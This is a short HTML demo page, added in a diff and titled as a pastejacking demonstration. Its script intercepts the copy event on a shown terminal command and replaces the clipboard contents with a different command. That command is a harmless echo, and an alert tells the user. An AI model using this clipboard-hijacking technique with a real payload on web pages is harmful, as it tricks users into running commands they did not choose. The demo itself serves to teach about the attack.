@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pastejacking Demo</title>
+</head>
+<body>
+    <h2>Pastejacking Demo By CyberRishabh</h2>
+    <p>Copy the command below and paste it in your terminal:</p>
+    <pre id="safe-command">echo "Hello, World!"</pre>
+
+    <script>
+        // JavaScript to hijack the copy functionality
+        document.getElementById('safe-command').addEventListener('copy', function(e) {
+            // Prevent the default copy behavior
+            e.preventDefault();
+
+            // Malicious command
+            const maliciousCommand = 'echo "Hacked!"';
+
+            // Set the clipboard data to the malicious command
+            if (e.clipboardData) {
+                e.clipboardData.setData('text/plain', maliciousCommand);
+            } else if (window.clipboardData) { // For older browsers
+                window.clipboardData.setData('Text', maliciousCommand);
+            }
+
+            alert('Your clipboard content has been hijacked!');
+        });
+    </script>
+</body>
+</html>
